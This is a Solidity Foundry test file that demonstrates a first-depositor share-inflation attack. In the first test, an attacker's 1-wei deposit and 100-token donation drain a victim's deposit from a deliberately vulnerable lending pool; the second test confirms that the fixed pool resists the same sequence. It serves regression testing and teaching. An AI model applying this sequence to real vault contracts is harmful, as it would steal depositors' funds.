// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test} from "forge-std/Test.sol";
import {IERC20} from "../../src/IPool.sol";
import {MockAsset} from "../../src/MockAsset.sol";
import {LendingPool} from "../../src/LendingPool.sol";
import {LendingPoolVulnerable} from "../../src/LendingPoolVulnerable.sol";

/// Directed first-depositor inflation PoC — the deterministic version of what
/// the invariant suite finds on its own. This is the 30-second run.
///
/// Sequence (both pools get the exact same calls):
///   1. attacker deposits 1 wei        -> 1 share
///   2. attacker donates 100 tokens    -> plain transfer, no shares
///   3. victim deposits 99 tokens
///   4. attacker withdraws everything
contract InflationAttack is Test {
    MockAsset internal asset;
    address internal attacker = address(0xA11CE);
    address internal victim = address(0xBEEF);

    function setUp() public {
        asset = new MockAsset();
        asset.mint(attacker, 200 ether);
        asset.mint(victim, 200 ether);
    }

    function test_inflation_attack_drains_vulnerable_pool() public {
        LendingPoolVulnerable pool = new LendingPoolVulnerable(IERC20(address(asset)), 0);

        vm.startPrank(attacker);
        asset.approve(address(pool), type(uint256).max);
        uint256 attackerShares = pool.deposit(1); // 1 wei -> 1 share
        asset.transfer(address(pool), 100 ether); // donation: moves the live-balance price
        vm.stopPrank();

        vm.startPrank(victim);
        asset.approve(address(pool), type(uint256).max);
        // 99e18 * 1 share / 100e18+1 balance = 0 shares. The deposit is a gift.
        uint256 victimShares = pool.deposit(99 ether);
        vm.stopPrank();

        uint256 attackerIn = 100 ether + 1;
        vm.prank(attacker);
        uint256 attackerOut = pool.withdraw(attackerShares);

        emit log_named_decimal_uint("attacker in ", attackerIn, 18);
        emit log_named_decimal_uint("attacker out", attackerOut, 18);
        emit log_named_uint("victim shares (99 deposited)", victimShares);

        assertEq(victimShares, 0, "victim's 99-token deposit minted zero shares");
        assertGt(attackerOut, attackerIn * 3 / 2, "attacker extracts >150% of input");
    }

    function test_fixed_pool_holds_under_same_sequence() public {
        LendingPool pool = new LendingPool(IERC20(address(asset)), 0);

        vm.startPrank(attacker);
        asset.approve(address(pool), type(uint256).max);
        uint256 attackerShares = pool.deposit(1); // 1 wei -> 1 share
        asset.transfer(address(pool), 100 ether); // donation: ledger ignores it
        vm.stopPrank();

        vm.startPrank(victim);
        asset.approve(address(pool), type(uint256).max);
        uint256 victimShares = pool.deposit(99 ether);
        vm.stopPrank();

        uint256 attackerIn = 100 ether + 1;
        vm.prank(attacker);
        uint256 attackerOut = pool.withdraw(attackerShares);

        emit log_named_decimal_uint("attacker in ", attackerIn, 18);
        emit log_named_decimal_uint("attacker out", attackerOut, 18);
        emit log_named_uint("victim shares (99 deposited)", victimShares);

        assertLe(attackerOut, attackerIn, "attacker cannot exceed their own input");
        assertApproxEqAbs(
            pool.convertToAssets(victimShares), 99 ether, 2, "victim keeps full value"
        );
    }
}
